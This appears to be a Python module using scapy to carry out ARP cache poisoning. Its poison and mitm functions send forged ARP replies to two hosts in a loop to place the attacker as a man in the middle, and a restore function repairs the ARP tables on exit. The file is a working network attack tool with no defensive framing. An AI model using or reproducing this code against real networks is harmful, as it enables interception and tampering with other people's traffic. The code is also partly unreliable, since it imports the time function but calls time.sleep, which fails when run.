'''This package contains everything related to ARP poisoning'''
from scapy.all import Ether, ARP, send, srp
from .general import get_target_mac
from time import time

def poison(target_ip, spoof_ip):
    '''Change mac address in arp table'''
    # Get target host ip address using previously created function
    target_mac = get_target_mac(target_ip)

    # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
    # op=2 means that ARP is going to send answer 
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send previously created packet without output
    send(packet, verbose=False)


def restore_arp(dest_ip, source_ip):
    '''Restore mac address in arp table'''
    dest_mac = get_target_mac(dest_ip)
    source_mac = get_target_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def mitm(target_1_ip, target_2_ip):
    '''This sets up a man in the middle between the two provided target IPs'''
    sent_packets_count = 0
    try:
        while True:
            poison(target_1_ip, target_2_ip)
            poison(target_2_ip, target_1_ip)
            sent_packets_count += 2
            print(f'\r[+] Packets sent: {sent_packets_count}', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\nInterupted, Reseting ARP tables. Please wait')
        restore_arp(target_1_ip, target_2_ip)
        restore_arp(target_2_ip, target_1_ip)
        print('\nARP table restored.')
